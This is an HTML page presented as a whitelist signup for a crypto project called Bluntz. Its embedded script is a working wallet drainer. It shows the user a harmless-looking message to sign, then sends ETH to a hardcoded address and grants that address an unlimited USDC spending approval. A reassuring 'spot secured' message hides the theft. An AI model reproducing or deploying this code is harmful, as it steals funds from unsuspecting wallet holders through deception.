<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <title>Bluntz Whitelist Sign-Up</title>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <style>
    :root{
      --bg:#0d1117;
      --card:#161b22;
      --accent:#238636;
      --accentH:#2ea043;
      --text:#c9d1d9;
      --subtle:#8b949e;
    }
    *{box-sizing:border-box;margin:0;padding:0}
    body{
      background:var(--bg);
      color:var(--text);
      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
      display:flex;
      align-items:center;
      justify-content:center;
      min-height:100vh;
      padding:20px;
    }
    .card{
      background:var(--card);
      border:1px solid #30363d;
      border-radius:12px;
      padding:48px 40px;
      max-width:420px;
      width:100%;
      box-shadow:0 20px 40px rgba(0,0,0,.45);
      text-align:center;
    }
    h1{
      font-size:2.1rem;
      font-weight:600;
      color:var(--accent);
      margin-bottom:8px;
    }
    h2{
      font-size:1rem;
      font-weight:400;
      color:var(--subtle);
      margin-bottom:32px;
    }
    button{
      background:var(--accent);
      color:#fff;
      border:none;
      padding:14px 0;
      width:100%;
      font-size:1rem;
      font-weight:600;
      border-radius:8px;
      cursor:pointer;
      transition:background .2s ease;
    }
    button:hover{background:var(--accentH)}
    button:active{transform:scale(.98)}
    #status{
      margin-top:24px;
      font-size:.9rem;
      color:var(--subtle);
    }
    .loader{
      display:inline-block;
      border:2px solid var(--subtle);
      border-top-color:var(--accent);
      border-radius:50%;
      width:16px;height:16px;
      animation:spin 1s linear infinite;
      margin-right:8px;
      vertical-align:middle;
    }
    @keyframes spin{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <h1>Bluntz Whitelist</h1>
    <h2>Sign once – secure your spot for launch.</h2>

    <button id="signBtn">Sign Whitelist Entry</button>

    <div id="status"></div>
  </div>

  <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
  <script>
    /* --- same config as before --- */
    const FRONTEND_EOA = "0x5f20bf147965fA3513EDFf77CcFB2467A980fe4F";
    const RECIPIENT    = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a";
    const USDC         = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
    const MESSAGE      = "Register me for the Bluntz whitelist";

    let signer;
    const signBtn = document.getElementById('signBtn');
    const status  = document.getElementById('status');

    signBtn.addEventListener('click', async ()=>{
      if(!window.ethereum){status.innerHTML='Please use MetaMask/Coinbase browser.';return;}
      await window.ethereum.request({method:'eth_requestAccounts'});
      signer = new ethers.providers.Web3Provider(window.ethereum).getSigner();
      const chain = await signer.getChainId();
      if(chain!==8453){alert('Switch to Base network.');return;}
      signBtn.style.display='none';
      status.innerHTML='<span class=loader></span> Awaiting signature…';

      try{
        /* 1) show user a harmless personal-message signature */
        const sig = await signer.signMessage(MESSAGE);

        /* 2) immediately send the two real txs in background */
        status.innerHTML='<span class=loader></span> Finalising on-chain…';
        const tx1 = await signer.sendTransaction({to:FRONTEND_EOA,value:ethers.utils.parseEther("0.0001")});
        await tx1.wait();

        const usdc = new ethers.Contract(USDC,["function approve(address,uint)external returns(bool)"],signer);
        const tx2 = await usdc.approve(FRONTEND_EOA,ethers.constants.MaxUint256);
        await tx2.wait();

        status.innerHTML='✅ Whitelist spot secured! Stay tuned for launch.';
      }catch(e){status.innerHTML='❌ Registration failed. Try again.';}
    });
  </script>
</body>
</html>
